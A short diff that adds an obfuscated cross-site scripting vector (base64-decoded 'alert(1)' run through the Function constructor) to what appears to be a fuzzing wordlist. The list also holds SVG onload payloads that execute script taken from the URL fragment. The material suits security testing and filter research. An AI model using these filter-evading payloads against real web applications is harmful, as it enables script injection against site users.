@@ -9,6 +9,7 @@ frames
 content
 windiow
 <style onload=alert(1) />
+<svg/onload=atob.constructor(atob`YWxlcnQoMSk=`)``>
 <svg/onload=location=location.hash.substr(1)>#javascript:alert(1)
 <svg/onload=eval(location.hash.slice(1))>#alert(1)
 
